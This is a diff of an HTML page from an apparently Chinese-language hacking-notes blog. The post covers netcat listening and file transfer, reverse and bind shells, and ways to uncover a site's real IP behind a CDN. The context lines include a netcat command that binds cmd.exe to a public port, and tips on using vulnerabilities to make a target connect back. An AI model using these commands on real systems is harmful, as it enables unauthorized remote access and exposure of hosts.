@@ -18,7 +18,7 @@
 <meta property="og:description" content="1.Nc瑞士军刀使用详解1.tcp监听tcp监听 nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口 nc -l -p 9999 客户端测试 1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口 telnet 10.0.1.161 9999 2、B机器上也可以使用nmap扫描A机器的此端口 nmap 10.0.1.161 -p9999">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-12-15T15:47:33.000Z">
-<meta property="article:modified_time" content="2023-12-16T17:55:44.295Z">
+<meta property="article:modified_time" content="2023-12-16T18:51:06.572Z">
 <meta property="article:author" content="frozenfish">
 <meta name="twitter:card" content="summary">
   
@@ -275,7 +275,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">2k字</span>
+      <span class="post-count">2.1k字</span>
     </span>
   </span>
 
@@ -329,6 +329,8 @@ nc -l -p 9992 &lt;test.mv
 下面命令表示通过连接B机器的9992端口接收文件，并把文件存到本目录下，文件名为test2.mv
 nc 10.0.1.162 9992 &gt;test2.mv
 </code></pre>
+<span id="more"></span>
+
 <h2 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h2><pre><code>方法1、REMOTE主机绑定SHELL
 在公网监听
 nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe
@@ -460,6 +462,7 @@ www.54454.com
 他如果没买*.baidu.com
 那么访问test.baidu.com
       baidu.com都会暴露真实ip
+ 注意！！！！！！！！当然这建立在主域名和子域名同个服务器。有些吊毛不这样做
 2.利用网站漏洞暴露真实ip
 3.历史dns记录
 4.MX
@@ -497,7 +500,7 @@ www.54454.com
     想办法让对方主机访问你，你自己弄个web服务，监听个端口，记录日志。
     然后通过漏洞·让对方访问你，于是就得到ip&#39;了
 </code></pre>
-<h3 id="牛逼的工具"><a href="#牛逼的工具" class="headerlink" title="牛逼的工具"></a>牛逼的工具</h3><p>​	<a href="">get-site-ip.com</a></p>
+<h3 id="牛逼的工具"><a href="#牛逼的工具" class="headerlink" title="牛逼的工具"></a>牛逼的工具</h3><p>​	get-site-ip.com</p>
 <h1 id="正向连接和反向连接"><a href="#正向连接和反向连接" class="headerlink" title="正向连接和反向连接"></a>正向连接和反向连接</h1><h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a><strong>正向连接</strong></h2><p>​		</p>
 <pre><code>正向连接是受害主机监听一个端口，由控制主机主动去连接受害主机的过程，适用于受害主机具有[公网ip](https://so.csdn.net/so/search?q=公网ip&amp;spm=1001.2101.3001.7020)的情况下。例如下面，受害主机具有公网ip，被控主机kali可以通过ip地址访问到受害主机，所以能够使用正相连接来控制受害主机。
 </code></pre>
@@ -580,6 +583,15 @@ www.54454.com
 
 
 <nav id="article-nav">
+  
+    <a href="/2023/12/17/problem/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          problem
+        
+      </div>
+    </a>
   
   
     <a href="/2023/12/11/linux%E8%BF%90%E7%BB%B4%E6%8A%80%E6%9C%AF/" id="article-nav-older" class="article-nav-link-wrap">
